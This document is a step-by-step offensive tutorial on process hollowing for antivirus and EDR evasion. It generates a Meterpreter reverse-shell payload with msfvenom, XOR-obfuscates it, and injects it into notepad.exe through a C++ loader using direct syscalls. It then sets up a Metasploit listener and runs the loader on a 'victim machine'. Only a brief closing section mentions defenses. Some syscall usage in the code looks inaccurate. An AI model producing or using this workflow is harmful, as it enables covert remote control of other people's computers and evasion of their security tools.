# Advanced Guide: Process Hollowing for AV/EDR Evasion

## 🎭 **1. What is Process Hollowing?**

Process Hollowing is a technique where:

1. A suspended process of a legitimate binary (e.g., `notepad.exe`) is created.
2. Its code is replaced with a malicious payload.
3. The process is resumed with the malicious code running in its memory space.

This technique helps evade many antivirus solutions because the process appears legitimate.

---

## 🛠 **2. Generate the Meterpreter Payload**

Run on Kali Linux:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=PORT -f raw -o shellcode.bin
```

- `LHOST`: Attacker's IP.
- `LPORT`: Listening port.

---

## 🏗 **3. Encrypt the Shellcode**

To evade detection, we apply a simple XOR encryption:

```python
shellcode = open("shellcode.bin", "rb").read()
encrypted_shellcode = bytearray([b ^ 0x55 for b in shellcode])

with open("shellcode_encrypted.bin", "wb") as f:
    f.write(encrypted_shellcode)
```

This `shellcode_encrypted.bin` will be included in `encrypted_shellcode[]` in the C++ code.

---

## 💻 **4. Improved C++ Code**

This code uses **direct syscalls** to avoid antivirus detection:

```cpp
#include <windows.h>
#include <iostream>
#include <vector>
#include "syscalls.h"  // Direct syscalls implementation

unsigned char encrypted_shellcode[] = { /* Encrypted Shellcode */ };
size_t shellcode_size = sizeof(encrypted_shellcode);

void decrypt_shellcode(unsigned char* shellcode, size_t size) {
    for (size_t i = 0; i < size; i++) {
        shellcode[i] ^= 0x55;
    }
}

int main() {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    if (!NtCreateProcess("C:\\Windows\\System32\\notepad.exe", &si, &pi)) {
        std::cerr << "Error creating process" << std::endl;
        return 1;
    }
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    NtGetThreadContext(pi.hThread, &ctx);
    LPVOID alloc = NULL;
    NtAllocateVirtualMemory(pi.hProcess, &alloc, 0, &shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    decrypt_shellcode(encrypted_shellcode, shellcode_size);
    NtWriteVirtualMemory(pi.hProcess, alloc, encrypted_shellcode, shellcode_size, NULL);
    #ifdef _WIN64
        ctx.Rip = (DWORD64)alloc;
    #else
        ctx.Eip = (DWORD)alloc;
    #endif
    NtSetThreadContext(pi.hThread, &ctx);
    NtResumeThread(pi.hThread);
    std::cout << "Process successfully injected" << std::endl;
    return 0;
}
```

---

## 🔧 **5. Compile the Code**

### 📌 **With MinGW**

```bash
x86_64-w64-mingw32-g++ process_hollowing_adv.cpp -o injector.exe -static -lntdll
```

### 📌 **With Visual Studio**

```bash
cl.exe /EHsc process_hollowing_adv.cpp /Fe:injector.exe
```

---

## 🎯 **6. Set Up Metasploit to Receive the Connection**

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT PORT
exploit
```

---

## 🚀 **7. Execute the Injector on the Victim Machine**

```bash
injector.exe
```

If everything goes well, `notepad.exe` will open, but it will actually be running **Meterpreter** in the background.

---

## 🛡 **8. How to Defend Against It**

To make the report more complete, mention defenses against this attack:
✅ **Windows Defender ASR Rules** → Block suspended processes. ✅ **Sysmon + SIEM** → Detect processes writing into other processes. ✅ **EDR (CrowdStrike, SentinelOne, etc.)** → Monitor memory code execution.

---

## 📌 **Conclusion**

✅ Now you have an `injector.exe` with **direct syscalls, encryption, and fewer forensic indicators**. If you want more improvements like **injection into other processes or anti-debugging techniques**, keep researching! 😈🚀



